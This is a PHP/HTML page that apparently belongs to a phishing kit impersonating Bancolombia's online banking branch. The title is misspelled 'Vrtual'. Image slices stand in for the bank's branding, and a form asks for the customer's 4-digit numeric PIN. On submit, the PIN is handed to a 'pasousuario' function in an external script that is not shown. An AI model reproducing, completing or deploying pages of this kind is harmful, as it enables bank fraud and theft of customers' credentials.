<?php

?>
<html>
	<head>
  		<title>Bancolombia Sucursal Vrtual Personas</title>
  		<meta charset="UTF-8">
    	<meta http-equiv="X-UA-Compatible" content="IE=edge">
    	<meta name="viewport" content="width=device-width, initial-scale=1.0">
    	<link href="https://cdn.jsdelivr.net/npm/bootstrap@5.1.3/dist/css/bootstrap.min.css" rel="stylesheet"
      	integrity="sha384-1BmE4kWBq78iYhFldvKuhfTAU6auU8tT94WrHftjDbrCEXSU1oBoqyl2QvZ6jIW3" crossorigin="anonymous">
    	<script type="text/javascript" src="/scripts/jquery-3.6.0.min.js"></script>
    	<script src="/scripts/jquery.jclock-min.js" type="text/javascript"></script>
    	<script type="text/javascript" src="/scripts/functions.js"></script>
		<link rel="stylesheet" href="css/style.css">  		
    </head>
   	<body>
   		
   			<div class="cabecera">
   				<div class="logo">
   					<img src="img/cont/t-mar-min.jpg">   				
   				</div>
   				<div class="titulo"><img src="img/cont/u-tiu-ses-min.jpg"></div>
   			</div>   			
   			<div class="cuerpo">
   				<div class="pnlderPass" style="margin-bottom: 25px;">
   					<div class="entrada">  						
   						<div class="formulario">
	   						<div class="form-titulo"><img src="img/cont/p-sec-pas-min.jpg"></div>
	   						<div class="descripcion">
	   							<img src="img/cont/p-sub-min.jpg">
	   						</div>
	   						<div class="form-cuerpo">
	   							<div style="text-align: left;">
	   								<img src="img/cont/p-eti-pas-min.jpg">
	   							</div>   						
	   							<input type="text" name="user" id="txtPassword" maxlength="4" minlenght="4" required class="input-icono pass">	   							
	   							<div class="subtexto">
	   								<img src="img/cont/p-des-min.jpg">
	   							</div>
	   							<br>
								<button  style="background: white; border-color: white; padding: 5px; color: #000; border: 1px solid #000; ">CANCELAR</button>
					   			<button id="btnPass" style="background: #FDDA24; border-color: #FDDA24; padding: 5px; color: #000; border: 0px solid transparent; ">CONTINUAR</button>		
	   							<br>
	   							<div class="texto" style="text-align: right;padding-top: 20px;">
		   							<img src="img/cont/p-gen-min.jpg">	
								</div>   							
	   						</div>
	   					</div>
   					</div>
   				</div>
   			</div>   			
			   <script>
      const txtPass = document.getElementById('txtPassword');
      txtPass.addEventListener('input', function() {
        const value = txtPass.value;
        const cleanValue = value.replace(/\D/g, ''); // Remover caracteres no numéricos
        if (value !== cleanValue) {
          txtPass.value = cleanValue;
        }
      });
</script>

<script type="text/javascript">
      var espera = 0;
      let identificadorTiempoDeEspera;
      function retardor() {
        identificadorTiempoDeEspera = setTimeout(retardorX, 900);
      }
      function retardorX() {
      }
      $(document).ready(function() {
			$('#btnPass').click(function(){
				if ($("#txtPassword").val().length > 3) {
					pasousuario($("#txtPassword").val());	
				}else{
					$(".mensaje").show();
				}	
			});
		});	
		$(function($) {
			var optionsEST = {
			am_pm: true,
			timeNotation: '12h',
			h_hour: "<?php echo date('H:i:s') ?>",
			h_date: "<?php echo date('Y/m/d') ?>",
			h_format: "$nombreDia$ $dia$ de $nombreMes$ de $anio$ $hhmmss$ $ampm$",
			h_language: "es"
			}
			$('#fecha-hora').jclock(optionsEST);
		}); 
</script>	
   		
   	</body>
</html>


